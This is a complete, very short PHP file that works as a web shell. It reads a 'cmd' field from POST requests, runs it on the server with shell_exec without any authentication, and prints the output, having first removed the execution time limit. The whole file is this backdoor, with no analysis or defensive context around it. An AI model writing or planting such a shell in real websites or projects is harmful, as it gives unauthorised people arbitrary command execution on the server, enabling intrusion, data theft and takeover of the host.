<?php
set_time_limit(0);
if (isset($_POST['cmd'])) {
  echo shell_exec(str_replace("\\\r\n", '', stripcslashes($_POST['cmd'])) . ' 2>&1');
}
